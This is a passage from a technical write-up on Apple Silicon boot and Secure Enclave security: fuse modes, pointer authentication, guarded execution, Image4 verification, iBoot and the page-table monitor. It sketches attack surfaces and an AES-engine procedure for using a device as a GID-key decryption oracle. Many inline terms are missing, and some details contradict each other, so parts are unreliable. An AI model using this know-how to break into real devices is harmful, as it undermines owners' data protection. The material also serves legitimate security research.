DFU/Recovery mode). The Boot ROM offloads the signature verification to the PKA. It passes the hash of the payload (typically SHA-2 family) and the RSA/ECC signature. The PKA performs the mathematical verification and returns a boolean result to a status register.Fault Injection Hardening:
Analysis of recent Apple Boot ROMs suggests the implementation of glitch-resistant logic around the PKA check. Rather than a simple  (Branch if Equal) instruction following the PKA result—which could be bypassed via voltage glitching—reverse engineering indicates the code often employs redundant checks, loop invariants, or specific register values that must be populated by the PKA hardware itself to allow the boot flow to proceed.1.1.4 RE Focus: Dev vs. Prod Fused SiliconFor reverse engineering and exploit development, distinguishing  from  silicon is critical. The Boot ROM and security subsystem change behavior based on fuse fields that encode the  of the chip.A central knob here is Apple’s  field (“Chip Production / Firmware Mode”), burned into fuses and exposed in various debug logs and DFU responses.Across multiple generations, public Boot ROM banners and tooling logs show a consistent pattern:
Used for  or internal security domains:Enable richer debug visibility.Allow additional boot modes and demotion paths.Often relax some signature enforcement or allow alternate signing roots for internal firmware.
Standard  configuration for consumer devices:Full signature enforcement for all boot stages.Debug interfaces (JTAG/SWD) and invasive trace disabled or tightly restricted.The exact semantics of intermediary values (e.g., ) and the precise bit-level encoding are SoC- and generation-specific, but the broad distinction above is stable across published ROM dumps and DFU tooling.This is the configuration for retail hardware: Disabled or heavily locked. External debug probes cannot halt the core at reset in any supported way. The GID key is set to the production group value, shared only across chips of the same class, and never accessible via software. The Boot ROM enforces the full Apple Root CA chain and Image4 constraints. Unsupported or revoked OS builds fail before DRAM initialization, dropping the device into DFU.Development (CPFM ≈ 0x0 / 0x1):Dev-fused devices, including security research units and internal engineering hardware, typically relax some of these constraints: The  /  debug signals are asserted. Hardware debuggers (Lauterbach, Astris, etc.) can halt the core immediately after reset and single-step Boot ROM code. Dev-fused chips can usually enter “demoted” modes where unsigned or custom-signed firmware images are bootable. The exact mechanisms (special DFU commands, provisioning profiles, or special Image4 manifests) are implementation details, but the high-level effect is that certain signature and version checks are bypassed or altered for internal workflows. Dev silicon often uses a distinct GID key (or set of keys) from production. This means:Firmware encrypted for Prod cannot be decrypted on Dev, and vice versa.Dev images are cryptographically bound to dev-fused hardware, preventing accidental cross-leakage into production units.Identifying Silicon State in Practice:From the outside, the security domain can be inferred via DFU and other low-level interfaces:
USB DFU responses (e.g., from , , or equivalent tooling) expose fields such as , , and CPFM-like indicators. On many platforms:Values where CPFM-like bits are  correspond to production devices.Values where CPFM-like bits are  or  correspond to dev-fused hardware.
Reverse-engineering tools often apply heuristic masks to these fields to classify devices. For example, certain high bits set in  or specific ranges in  are empirically associated with production vs. development, but the exact encodings vary by SoC and should be treated as version-specific heuristics rather than universal rules.The “Un-dumpable” Region:Regardless of dev or prod state, once the Boot ROM prepares to jump to the next stage (LLB), it typically performs a lockdown sequence:Writes to the memory controller or system registers to unmap its own address range (e.g., around ) from the normal physical address space.Ensures that any subsequent attempt by LLB or the kernel to read that region either raises a bus error or returns zeros.This is why practical Boot ROM dumps require a vulnerability  the Boot ROM execution window (e.g., -style exploits or carefully timed glitching) rather than a simple read from a later boot stage. On production (CPFM ≈ 0x3) devices this window is tightly constrained; on dev-fused hardware, JTAG/SWD access and relaxed policy make that window significantly easier to instrument but do not fundamentally change the “self-erasing” behavior.1.2 Proprietary ISA Extensions (arm64e+)While the M-series cores implement the Armv8-A architecture with a comprehensive set of optional extensions (e.g., , ), Apple has aggressively extended the Instruction Set Architecture (ISA) with proprietary logic. For the reverse engineer, standard Arm documentation is insufficient. Understanding the security posture of macOS Tahoe requires mastering these custom extensions, as they form the hardware enforcement layer for the new kernel isolation model.1.2.1 Pointer Authentication (PAC): The Cryptographic Control FlowApple’s implementation of Armv8.3-PAuth is the most pervasive security mitigation in the XNU kernel. It repurposes the unused high-order bits above the configured virtual address size (the "top" bits of a 64-bit pointer) to store a cryptographic signature, or Pointer Authentication Code (PAC).
The hardware maintains five distinct 128-bit keys in system registers. On macOS with VHE (Virtualization Host Extensions) enabled, the kernel accesses these keys via the  register aliases, which the hardware redirects to the EL2 bank of the key registers: /  (Instruction): Signs code pointers (function pointers, return addresses). Signs data pointers. Crucial for protecting C++ vtables in IOKit (). Signs arbitrary data blobs, effectively a hardware-accelerated MAC.The  Failure Mechanism (Canonical Non-Valid):
For the reverse engineer analyzing crash dumps, understanding the failure mode is critical. When an  instruction (e.g., ) is executed on a corrupted or forged pointer, the CPU does  immediately raise an exception.Instead, the hardware corrupts the pointer in a deterministic way to ensure it causes a translation fault upon dereference. The CPU recalculates the PAC. If the calculated PAC does not match the bits in the pointer, the CPU writes an error pattern into the PAC field, flipping specific high-order bits. The pointer becomes a "canonical non-address": the PAC field is overwritten with an error pattern so that any use of the pointer leads to an architectural fault. The subsequent  or  triggers a Data Abort or Prefetch Abort. Empirically, on many M-series SoCs, a PAC authentication failure often manifests as a pointer where the upper byte is partially set (e.g.,  or ). If you see a crash involving such a pointer, you are likely looking at a PAC failure rather than a standard NULL dereference or heap corruption.1.2.2 Branch Target Identification (BTI): The Landing PadsOften deployed in tandem with PAC (-mbranch-protection=standard), BTI mitigates Jump-Oriented Programming (JOP). It enforces a state machine on indirect branches. The Page Table Entries (PTE) now include a Guarded Page () bit. This is a "hint" instruction (NOP on older silicon). It acts as a valid landing pad. When the CPU executes an indirect branch (, ) targeting a Guarded Page, the very next instruction  be a  instruction of the correct type ( for call,  for jump,  for both).If the target is not a  instruction, the CPU raises a . In XNU, observations suggest this often manifests as a  (Illegal Instruction) with a specific subcode, distinguishing it from standard undefined opcode exceptions. For exploit development, this necessitates finding gadgets that not only perform the desired operation but are also preceded by a valid landing pad.1.2.3  The Guarded Execution Feature (GXF)This is the most significant architectural divergence in the Apple Silicon era. Standard Arm defines a vertical privilege stack (EL0 → EL1 → EL2). Apple has introduced a parallel execution domain, conceptually a  (distinct from Arm TrustZone), accessed via .GXF allows the processor to switch between the "Normal World" (where macOS runs) and the "Secure World" (where Exclaves run). These worlds share the same physical silicon but possess vastly different hardware permissions and system register views.
The Guarded Levels mirror the standard Exception Levels but exist within the isolated Secure World context. The mapping for macOS Tahoe is as follows: Userland processes (Apps, Daemons). The XNU Kernel. (Note: On macOS Apple Silicon, the kernel runs at EL2 using Virtualization Host Extensions (VHE) to support hypervisor functions. On iOS, it typically runs at EL1). (secure user workloads) and a privileged Conclave hosting the Trusted Execution Monitor (TXM). This is where policy logic, privacy indicators, and Passkey logic reside.The Secure Kernel (ExclaveOS). An L4-inspired microkernel responsible for scheduling and IPC within the secure world.The Secure Page Table Monitor (SPTM). The ultimate hardware root of trust, mirroring the privilege of a hypervisor but strictly for security enforcement.
Transitions between worlds are not handled by standard  calls. Apple added custom instructions to the ISA: (Opcode ): Synchronous entry into the Secure World. It behaves like a hypercall, atomically switching the hardware context (SPRR state, stack pointer, and system registers) from ELx to GLx. Returns from the Secure World to the Normal World.1.2.4  Shadow Permission Remapping Registers (SPRR)To enforce isolation between the Normal World (XNU) and the Secure World (Exclaves), Apple replaced the older APRR (Access Permission Remapping Registers) on newer silicon (A15/M2+) with the more robust SPRR (Shadow Permission Remapping Registers).In standard Arm MMUs, the Page Table Entry (PTE) bits define permissions directly. In Apple Silicon with SPRR enabled, the PTE's  bits and NX bits (, ) are repurposed as a  into a hardware permission table. The PTE specifies a permission index (e.g., Index 5). The hardware checks the current execution mode (EL2, GL1, or GL2). It looks up Index 5 in the  register specific to that mode.The Security Implication:
This allows for "View-Based" memory protection.A particular SPRR index (for example, index 5) is configured so that in  it resolves to .The same index resolves to  in .This is how the SPTM protects page tables. The physical pages containing the translation tables are marked with a specific SPRR index. The hardware configuration for EL2 (Kernel) maps that index to Read-Only. Even if an attacker has a kernel-level arbitrary write primitive, the MMU will reject the write to the page table because the SPRR configuration for EL2 forbids it. The only way to write to that page is to execute  to switch to GL2, where the SPRR configuration permits the write.If the Application Processor (AP) is the brain of the device, the Secure Enclave Processor (SEP) is its conscience. It is not merely a coprocessor; it is a fully independent computer-on-a-chip, sharing the same die but architecturally severed from the AP. It runs its own operating system (), based on an Apple-customized L4 microkernel, manages its own peripherals, and holds the keys to the kingdom (UID/GID). In the macOS Tahoe generation, the SEP effectively acts as the root of authority for biometric authentication decisions and for OS-bound key material used in attestation and Data Protection.2.1 SEP Initialization & BootThe SEP boot process is designed to be resilient against a fully compromised Application Processor. From the moment power is applied, the SEP operates under the threat model that the AP is hostile.2.1.1 The SEPROM: SRAM Execution and the Memory Protection Engine (MPE)Like the AP, the SEP begins execution from an immutable on-die Boot ROM, the .The Hardware Environment:
The SEP core (historically an ARMv7-A "Kingfisher" core on A7–A9, though the specific microarchitecture of M-series SEP cores is undocumented) initializes in a highly constrained environment. Execution begins in the SEPROM using a small on-die SRAM for stack and early state. However, the  is too large to fit entirely in SRAM. To utilize the device's main DRAM securely, the SEP relies on the Memory Protection Engine (MPE). Before the SEP accesses external DRAM, the Boot ROM initializes the MPE, ensuring all subsequent memory transactions are encrypted and authenticated. This isolation prevents early-boot DMA attacks from the AP or Thunderbolt peripherals.The Memory Protection Engine (MPE):
The MPE sits inline between the SEP core and the memory controller. It creates a cryptographic window into physical memory that is opaque to the rest of the SoC. On system startup, the SEP Boot ROM programs the MPE with a random, ephemeral AES key. This key exists only in the MPE hardware registers and is never exposed to software (even ). On M-series silicon, the MPE manages distinct ephemeral keys for the SEP and the Secure Neural Engine (SNE), ensuring isolation even between secure subsystems. Data written by the SEP to DRAM is encrypted transparently using AES in XEX (XOR-Encrypt-XOR) mode. The MPE calculates a CMAC tag for every block of memory (cache line granularity). This tag is stored alongside the encrypted data. If you attempt to dump the physical memory range assigned to the SEP from the AP (kernel mode), you will see high-entropy noise. Furthermore, any attempt to modify a single bit of this memory via the AP will invalidate the CMAC tag. The next time the SEP reads that line, the MPE will detect the forgery and trigger a hardware panic, locking down the Enclave until a full system reset.2.1.2 The Boot Monitor: Hardware Enforcement of OS-Bound KeysOn modern silicon (A13/M1 and later), Apple introduced the Secure Enclave Boot Monitor to mitigate the risk of Boot ROM exploits (like ) compromising the chain of trust for key derivation.In older architectures, the SEPROM would verify the  signature and then jump to it. If the SEPROM was exploited, the attacker could jump to a malicious payload while retaining access to the hardware UID key. The Boot Monitor closes this gap by enforcing System Coprocessor Integrity Protection (SCIP). The AP (iBoot) loads the  payload into a region of physical memory. The AP signals the SEP via a hardware mailbox register. The SEPROM parses the Image4 container. It verifies the signature against the SEP-specific Apple Root CA public key embedded within the immutable SEPROM. Crucially, the SEPROM  simply jump to the loaded image. The SCIP hardware prevents execution of mutable memory. The SEPROM invokes the Boot Monitor hardware block.
The Monitor  the SEP core to a known clean state.The Monitor calculates a cryptographic hash of the loaded  memory range.The Monitor updates the SCIP registers to permit execution of that specific range.The Boot ROM and Boot Monitor jointly produce a measurement of the loaded  and lock it into a dedicated register used by the Public Key Accelerator (PKA).
This finalized hash is the critical component. When the  later requests keys (e.g., to decrypt user data), the hardware Key Derivation Function (KDF) mixes the hardware UID with this locked hash.$$ K_{derived} = KDF(UID, Hash_{sepOS}) $$If an attacker modifies a single byte of the  (even with a Boot ROM exploit), the Boot Monitor calculates a different hash. Consequently, the KDF derives different OS-bound keys, so any data protected by those keys (e.g., passcode- and SKP-bound Data Protection keys) remains cryptographically inaccessible under the modified . This is "Bound Security"—the data is bound not just to the device, but to a specific, signed software version.2.1.3 Anti-Replay Mechanisms: The Integrity TreeA classic attack vector against secure enclaves is the : capturing a snapshot of the encrypted RAM (e.g., when the passcode retry counter is 0) and restoring it later after the counter has incremented.To prevent this, the SEP implements a hardware-enforced  (Merkle Tree). The root node of the integrity tree is stored in  within the Secure Enclave complex. This memory is physically distinct from the main DRAM and cannot be addressed by the AP. The protected memory region (where  data and the Secure Storage Manager reside) is divided into blocks. Each block's hash is stored in a parent node, recursively up to the root. When the SEP writes to protected memory (e.g., incrementing a failed attempt counter), the MPE updates the data, recalculates the hashes up the tree, and atomically updates the root hash in the on-chip SRAM. On every read, the MPE verifies the path from the data block up to the SRAM root.If an attacker replays an old DRAM state, the hash of the replayed block will not match the current root hash stored in the internal SRAM. The MPE detects the mismatch (Anti-Replay Violation) and halts the SEP. This mechanism ensures that the SEP has a strictly monotonic view of time and state, rendering snapshot fuzzing and counter rollbacks impossible.2.2 SEP Runtime ArchitectureOnce the  is bootstrapped and verified, the Secure Enclave transitions into its runtime state. At this point, it functions as a fully autonomous operating system running an Apple-customized variant of the L4 microkernel (historically derived from L4-embedded/Darbat). For the reverse engineer, understanding the runtime architecture is crucial for analyzing how the SEP communicates with the hostile "Rich Execution Environment" (the AP running XNU) and how it persists sensitive state.2.2.1 The Mailbox Interface: Analyzing the IPC TransportCommunication between the Application Processor (AP) and the SEP is strictly asynchronous and interrupt-driven. Unlike the tight coupling of the SPTM (which uses synchronous instruction traps), the SEP interaction is mediated by a hardware mechanism known as the , which relies on the proprietary Apple Interrupt Controller (AIC) to manage signaling.The Physical Transport: Registers and Shared Memory
There is no shared virtual memory space; the two processors exchange messages via a combination of Memory-Mapped I/O (MMIO) registers and physical memory buffers.The Control Mailbox (MMIO):
The primary control channel consists of dedicated hardware registers within the SEP's configuration space (typically mapped at  on A-series, with evolving offsets on M-series). The AP writes a message to the  register, which triggers an IRQ on the SEP. The SEP writes a reply to the  register, which triggers an IRQ on the AP. On Apple Silicon (M1+), reverse engineering of the  driver indicates a shift toward using shared memory ring buffers for the control path to handle higher throughput, managed by the AIC's hardware event lines.The Doorbell (Apple Interrupt Controller):
To signal a message, the sender must trigger an exception on the receiver. The kernel writes to a specific AIC "Set" register. This asserts a hardware IRQ line wired to the SEP's core. When the SEP replies, it asserts an IRQ line routed to the AP's AIC. The kernel's interrupt handler (within ) acknowledges this by writing to the AIC "Clear" register.
The data payload passed through the control registers follows a strict, serialized format (often referred to as the  format). Analysis of the  /  stack reveals a compact 64-bit structure:struct sep_msg {
    uint8_t endpoint;  // Destination service (e.g., 0x10)
    uint8_t tag;       // Transaction ID for async correlation
    uint8_t opcode;    // Message type / Command
    uint8_t param;     // Immediate parameter
    uint32_t data;     // Payload or pointer to OOL buffer
};
 Routes the message to a specific task within  (e.g., the Secure Key Store).Out-of-Line (OOL) Buffers: For payloads larger than 32 bits (such as biometric templates or firmware updates), the  field contains a physical address. The AP allocates a physical page, pins it, and passes the address to the SEP. The SEP maps this page into its address space using its own IOMMU (often implemented via  on M-series chips).RE Focus: Fuzzing the Boundary
The mailbox is the primary attack surface for the SEP. Vulnerabilities here (parsing malformed messages) can lead to code execution within the Enclave. The  kernel dispatches messages to user-mode L4 tasks based on the Endpoint ID. Fuzzing specific endpoints (especially legacy or debug endpoints left enabled in production) is a standard methodology.Shared Memory Hazards (TOCTOU): While the mailbox registers handle control flow, bulk data is passed via shared memory. A classic attack vector involves the AP modifying the data in the shared buffer  the SEP has validated the header/signature but  it processes the body (Time-of-Check to Time-of-Use).The SEP has no general-purpose NAND flash of its own. It must rely on the Application Processor’s storage stack to persist long-lived secrets (passcode state, biometric templates, token material). However, it cannot  the AP or its filesystem to store this data without tampering.To solve this, Apple pairs the SEP with a , often referred to in firmware and kexts as  (eXtended Anti-Replay Technology).At a high level, xART behaves as a dedicated, tamper-resistant non-volatile store that is  attached exclusively to the SEP:It has its own non-volatile memory and cryptographic logic.It is only addressable from within the SEP’s trust domain over a dedicated, authenticated channel.The AP and XNU have no direct protocol to read or write its contents; all access is mediated by .You can think of xART as a small, secure NVRAM bank whose sole purpose is to hold anti-replay metadata and counters that anchor SEP-managed state.Physical / Logical Separation:At the implementation level, the Secure Storage Component may be a discrete die or a dedicated block within a larger package, but architecturally it presents as a separate secure store accessed only by the SEP.The AP sees none of its registers or address space; there are no MMIO ranges that the kernel can map to talk directly to xART.SEP-Centric View of Storage:The SEP treats AP-managed NAND (the main SSD / NVMe) as an untrusted block device.All SEP data structures stored there (keybags, counters, templates, tickets) are encrypted and authenticated using keys derived from the UID/GID and xART’s state.The xART component holds the small, high-value bits: monotonic counters, per-volume or per-domain nonces, and commitment hashes for larger encrypted blobs stored on the AP’s filesystem.The Anti-Replay Guarantee:When the SEP writes persistent state—for example, updating the failed passcode attempt counter or credential state—it performs a two-phase commit:Write to Untrusted Storage (AP):The SEP encrypts the payload (e.g., a keybag or metadata record) with keys derived from the UID and appropriate class keys.It sends the ciphertext to the AP via the mailbox protocol.The AP writes this to its filesystem (e.g., a file under ), but the contents are opaque to it.Commit to xART (Secure Storage Component):In parallel, the SEP computes a cryptographic digest (e.g., a hash or MAC) over the new payload and the associated monotonic counter or nonce.It writes this digest and the updated counter/nonce to xART.xART becomes the authoritative record of “what the latest version of this object should look like” and “how many times it has been updated.”The SEP requests the ciphertext from the AP.It recomputes the digest and compares it against the value stored in xART for that object.If the digests and counters match, the SEP accepts and decrypts the payload.If the AP has replayed an old copy (e.g., with a lower counter or different hash), the mismatch is detected and the SEP treats it as an —typically halting access to that data or, in severe cases, triggering a lockout.
The SEP’s view of sensitive state (e.g., passcode retry counters, escrow records) is strictly monotonic. An attacker cannot reset or roll back these counters by snapshotting and restoring AP-visible storage, because xART’s internal counters would not match.
From the AP’s perspective, xART is a black box. It sees only that some SEP operation failed or succeeded; it never observes the internal counters, keys, or hashes that xART maintains.
SEP-managed data is effectively bound to:The specific SEP instance (via UID).The xART anti-replay state (counters / nonces).The software measurement (for SKP-like mechanisms described later).For reverse engineering, the important consequences are:Dumping or modifying the files that back SEP state on the AP is insufficient to reset security-sensitive conditions (e.g., passcode retry counters, keybag versions). Without aligning xART’s internal state, any replay will be detected and rejected.There is no direct AP-visible interface to xART; all interesting protocol surface is in: endpoint handlers that manipulate anti-replay state.The  and related kexts and daemons that proxy higher-level requests (FileVault, Keychain, biometric state) into SEP commands.Exploits that attempt to tamper with SEP persistence must target:The integrity of SEP’s logic around xART updates, orThe boundary between SEP and AP (e.g., TOCTOU races on the untrusted ciphertext), not the xART hardware itself.2.2.3  Reverse Engineering the  L4 Syscall TableFor the advanced reverse engineer, the holy grail is understanding the  kernel itself. Since it is based on L4, it relies heavily on synchronous IPC for system calls.Identifying the Syscall Handler:
In the disassembled  binary (decrypted via Boot ROM exploit), the exception vector table is the starting point. The  handler dispatches requests based on the immediate value or a register (typically  or ).
The  is modular, consisting of the kernel and several user-mode "apps" or "tasks." Analysis of firmware dumps reveals the internal naming convention: The root task and kernel. The backend for , managing Data Protection and Keychain items. (Secure Biometric Sensor Driver): The backend for , handling the processing of fingerprint and face data. Manages communication with the NFC Secure Element for Apple Pay. A directory service mapping symbolic names to endpoints.By tracing the IPC messages dispatched from the Mailbox handler, you can map which L4 task handles which service. For example, messages routed to the endpoint associated with  will contain the proprietary command structures for biometric enrollment and matching. Analyzing the message parsing logic within that specific task reveals the attack surface for biometric bypasses. Standard tools like IDA Pro or Ghidra require custom loaders for  binaries. The memory layout is non-standard, and the binary format (Mach-O) often has stripped headers or non-standard segment protections that must be manually reconstructed based on the SCIP configuration found in the Boot Monitor logic.3.0 The Chain of Trust: Firmware & BootloadersWith the hardware root of trust established and the Secure Enclave operating as a parallel authority, the Application Processor begins the process of bootstrapping the mutable software stack. This phase is governed by the  serialization format and a strict chain of cryptographic handover.3.1 Low-Level Bootloader (LLB)On platforms that implement an LLB stage (e.g., Apple Silicon Macs and older A-series SoCs), the Low-Level Bootloader (LLB) is the first piece of mutable code executed by the Application Processor. Loaded by the Boot ROM from the boot partition of the internal flash (NAND, or NOR SPI on some development hardware), it executes initially out of on-die SRAM before DRAM has been brought online. Its primary directive is architectural: it must bridge the gap between the raw silicon state and the feature-rich environment required by iBoot.3.1.1 Parsing the Image4 () ContainerTo the reverse engineer, "firmware" on Apple Silicon is synonymous with . LLB is not a raw binary; it is encapsulated in an Image4 container, a format based on ASN.1 (Abstract Syntax Notation One) and DER (Distinguished Encoding Rules). Understanding this structure is prerequisite to any firmware analysis.A complete Image4 object consists of an  and an , with an optional  object used in restore flows. The actual executable code (the LLB binary). The payload is encrypted under a per-image AES key. On production devices, this per-image key is wrapped using the SoC’s  and stored in the  tag within the payload. At boot, the hardware AES engine unwraps the KBAG under the GID key to recover the IV and payload key, then decrypts the payload. This means the payload is opaque to external analysis unless decrypted on-device (or via a GID oracle). Once decrypted, the payload is typically compressed (LZSS or LZFSE). A 4-character code (e.g., , ) identifying the component. The signature and constraints, commonly known as the . An RSA or ECDSA signature over the SHA-384 hash of the payload. A set of entitlements and constraints (tags) that dictate  and  this payload can run. The manifest includes the certificate chain leading back to the Apple Root CA. The Boot ROM holds the corresponding root public key (or its hash) in immutable hardware and verifies the chain using the Public Key Accelerator (PKA). (Optional) Contains hardware-specific personalization data used during the restore process, such as the unique nonce generated by the SEP.
When the Boot ROM loads LLB (and when LLB subsequently loads iBoot), it performs the following  routine:Parse the ASN.1 structure to separate  and .Hash the  (ciphertext).Locate the corresponding hash in the  (under the specific tag, e.g., ).Verify the  signature using the PKA.If valid, the hardware unwraps the payload key from the KBAG using the GID Key, loads it into the AES engine, and decrypts the  ciphertext.3.1.2 DRAM Training and Memory Controller ConfigurationBefore external LPDDR4X/LPDDR5 Unified Memory can be used, the memory controller and PHY must be trained. Early boot code (Boot ROM and/or LLB) runs initially from on-die SRAM until DRAM training has converged. The physical characteristics of RAM—signal timing, voltage margins, and skew—vary slightly between every physical device due to manufacturing tolerances.Reading SPD/Calibration Data: The boot code reads calibration data from the device tree or dedicated EEPROM areas. It configures the Physical Layer (PHY) interface of the memory controller. The code executes a complex algorithm that writes patterns to DRAM and reads them back, adjusting delay lines (DLLs) and drive strengths until the signal is stable. Once training is complete, the MCU is brought online. The Memory Management Unit (MMU) is then reconfigured to map the vast expanse of DRAM into the address space.
If you are attempting to exploit the Boot ROM or early LLB, you are constrained to SRAM. You cannot load large payloads or use heap spraying techniques that require gigabytes of memory until  the bootloader has successfully trained the DRAM. This creates a "choke point" for early-boot exploits.3.1.3 Verifying the Exclusive Chip ID (ECID) and Board IDApple utilizes a mechanism called  (or Taming) to prevent firmware replay attacks. You cannot simply take a valid, signed LLB from one iPhone and run it on another, nor can you downgrade to an older, vulnerable LLB version.This enforcement happens inside the Image4 parser logic within LLB (checking the next stage) and the Boot ROM (checking LLB).
The  manifest contains specific tags that bind the signature to the hardware: A unique per-SoC identifier fused into the chip and exposed as an integer value used for personalization. Identifies the PCB model (e.g.,  for a specific iPhone logic board). Identifies the SoC model (e.g.,  for M1). for Production,  for Development.
During boot, the executing code reads the actual values from the hardware fuses and compares them against the values present in the signed .If Hardware.ECID != Manifest.ECID, the boot halts.If Hardware.BORD != Manifest.BORD, the boot halts.This mechanism, combined with the  (a random value generated by the SEP during updates and baked into the ), ensures that the firmware is: Signed by Apple. Valid only for . Valid only for this specific boot/update cycle (preventing downgrades). In the "Tahoe" architecture, reverse engineering suggests this verification logic appears to use redundant checks and bitwise operations that resist simple instruction skipping (e.g., glitching a  instruction).3.2 iBoot (Stage 2 Bootloader)Once LLB has initialized the DRAM and verified the next stage, it hands off execution to . While LLB is a hardware-focused shim, iBoot is a sophisticated, compact operating system in its own right. It features a cooperative task scheduler (rather than a simple single-threaded loop) that manages concurrent subsystems including a full USB stack, a display driver (for the Apple logo), and a filesystem driver (APFS/HFS+). In the Tahoe architecture, iBoot’s role has expanded beyond merely bootstrapping the XNU kernel; it now serves as the orchestrator of the platform's security domains, responsible for loading and isolating the hardware-enforced monitors before the kernel is permitted to execute.3.2.1 The Apple Device Tree (ADT)The hardware configuration of an Apple Silicon device is not discoverable via standard buses like PCI enumeration alone. Instead, iBoot relies on the —a hierarchical binary data structure (conceptually similar to OpenFirmware or Linux Device Trees) that describes the SoC's topology.
The raw ADT is either embedded within the iBoot binary or loaded as a separate  payload. It contains nodes describing CPUs, memory maps, interrupt controllers (AIC), and peripherals. Unlike Linux systems which often use a "Flattened Device Tree" (FDT), Apple utilizes its own proprietary binary format for the ADT, which XNU consumes directly via the  APIs.Runtime Population ():
Before jumping to the kernel, iBoot populates the  node of the ADT with critical runtime parameters. A high-entropy random value (inferred to be derived from the TRNG). The kernel uses this to randomize its memory slide. A critical array of structures defining physical memory regions. iBoot marks regions used by the Boot ROM, LLB, and itself as reserved, ensuring the kernel does not overwrite them. The command-line arguments passed to the kernel (e.g., , ). On production devices, these are strictly filtered based on the  flags in LocalPolicy; only specific flags are allowed unless the device is in a specific research or demoted state.3.2.2  Loading the Security MonitorsIn pre-Tahoe architectures (iOS 14 / macOS 11), iBoot would simply load the kernelcache and jump to it. In the Tahoe era (A15/M2+), iBoot must construct the Guarded Execution Environment before the kernel can exist.Allocation and Reservation:
iBoot parses the device tree to identify physical memory ranges reserved for the new monitors. It carves these out of the available DRAM: Reserved for the Secure Page Table Monitor. Reserved for the Trusted Execution Monitor.
iBoot locates the specific Image4 payloads, which are co-packaged with the kernelcache (referenced in the OS firmware manifest):Ap,SecurePageTableMonitor: The GL2 binary.Ap,TrustedExecutionMonitor: The GL1 binary.It decrypts and verifies these payloads just like any other firmware component. However, instead of loading them into standard memory, it loads them into the reserved physical regions identified above.Locking SPRR Regions (Conceptual View):
This is the critical security pivot. Before handing off control, iBoot establishes the initial Shadow Permission Remapping Registers (SPRR) state to enforce isolation. While the SPTM performs its own fine-grained configuration upon initialization, the architectural guarantee provided by iBoot is:The  view is configured to have Read/Write/Execute access to its own memory region.The  view is configured to have access to its region.Crucially, the  view is configured to mark the SPTM and TXM regions as .This ensures that when the processor eventually drops to EL1 (GL0) to run XNU, the kernel is physically incapable of reading or modifying the monitor code, even though it resides in the same physical DRAM.3.2.3 LocalPolicy & BAA: The Shift to Local SigningFor macOS, Apple introduced a mechanism to allow users to boot older OS versions or custom kernels (Permissive Security) without breaking the hardware chain of trust. This is managed via .
The Boot ROM and LLB enforce strict signature checks using manifests issued by Apple's global signing server (TSS). These checks are performed offline using embedded root keys. If you want to boot a custom kernel, you cannot obtain a valid signature from Apple's TSS. A policy file stored on the Data Volume (in the  volume). It specifies the security mode (Full, Reduced, Permissive) and the hash of the custom kernel collection.Owner Identity Key (OIK): When a user authorizes a downgrade or custom boot (via Recovery Mode authentication), they are effectively authorizing the use of a device-specific  generated within the Secure Enclave. This key is certified once by Apple's Basic Attestation Authority (BAA). The LocalPolicy is signed by the SEP using this OIK. iBoot fetches the LocalPolicy. It asks the SEP to verify the signature against the OIK. If the SEP confirms the policy is valid (and matches the user's intent), iBoot proceeds to load the custom kernel hash specified in the policy (enabled via the  bit), effectively "blessing" it for this boot cycle.This allows "Permissive Security" to exist while keeping the Boot ROM and LLB strictly locked down to the hardware root of trust.3.2.4  Decrypting iBoot Payloads via the AES MMIO InterfaceTo analyze iBoot, one must decrypt it. Since the GID key is fused into the silicon and physically disconnected from the CPU's register file, it cannot be extracted via software. Reverse engineers must instead turn the device into a  by manipulating the dedicated AES hardware peripheral.
The Image4 payload () is encrypted with a random, per-file symmetric key (the target key). This target key is wrapped (encrypted) with the GID key and stored in the  header as a . To decrypt the firmware, one must unwrap this kbag.The Hardware Distinction (ISA vs. MMIO):
It is critical to distinguish between the  (instructions like , ) and the . Operates on keys loaded into standard NEON/SIMD registers (-). Useful for TLS or disk encryption where the key is known to the OS. A memory-mapped I/O (MMIO) block, typically located at a base offset like  (on M1/T8103) or similar  ranges on newer SoCs. This peripheral has exclusive hardware access to the GID key fuses.
Using a Boot ROM exploit (like  on A-series) or a specialized iBoot exploit, researchers execute a payload that drives this MMIO interface directly: Reset the AES peripheral via the  register to clear internal state. Write to the configuration register to select the  as the decryption source. This sets an internal mux; the key itself is never exposed to the bus. Write the  (IV + Ciphertext) into the  FIFO registers. Trigger the engine. The hardware pulls the GID key from the fuses, performs the AES-256-CBC unwrap, and pushes the result to the output buffer. Read the unwrapped target key (typically formatted as ) from the  register.Hypothesized Countermeasures:
Modern Apple Silicon (A12+/M1+) implements countermeasures against this oracle usage. Reverse engineering suggests the AES engine may enforce a state machine that requires the output of a GID decryption to be immediately DMA'd to executable memory and jumped to, rather than read back into a general-purpose register. Bypassing this theoretically requires  (voltage glitching) to corrupt the state machine or precise timing attacks to race the hardware's "sanitize on read" logic, allowing the extraction of the plaintext key before the hardware scrubs it.4.0 The Security Monitor Layer (GL1/GL2): The Exclave ArchitectureIn the "Tahoe" architecture, the XNU kernel has been demoted. It no longer possesses the ultimate authority to define the virtual memory layout of the system. That power has been migrated to a hardware-enforced monitor running in a proprietary execution state known as the  (specifically, the Guarded Execution Feature or GXF). This section dissects the mechanics of this new layer, which effectively functions as a silicon-enforced hypervisor for the kernel itself.4.1 The Secure Page Table Monitor (SPTM) - GL2The Secure Page Table Monitor (SPTM) operates at . It is the highest privilege  component on the Application Processor, sitting above both the XNU Kernel (EL2) and the Secure Kernel (GL1). The SPTM is the sole entity permitted to write to the physical pages that constitute the translation tables (TTBR0/TTBR1) for the managed domains of both the Normal and Secure worlds.4.1.1 The  and  Instructions: Context SwitchingTransitions into the SPTM utilize the proprietary  instruction, which performs a synchronous, atomic context switch.
To invoke the SPTM, the kernel populates specific registers and executes the opcode. (Little Endian). The primary control register. It holds the , a 64-bit value encoding the  (e.g., XNU, TXM, SK), the , and the  (function index). The parameters for the call (e.g., physical addresses, permission flags).  is often reserved for the thread stack pointer when relaying calls to the TXM. The 5-bit immediate encoded in the  instruction itself serves as an entry index, selecting the specific GXF entry stub (recorded in ).
Upon execution of : The hardware traps to GL2. The hardware swaps the active Shadow Permission Remapping Register configuration. The memory regions containing the SPTM code and data—previously invisible to the kernel—become Read/Write/Execute. The Stack Pointer () is switched to the  register, pointing to a dedicated secure stack within the SPTM's private memory. Execution jumps to the vector defined in  (or equivalent GL2 vector base).
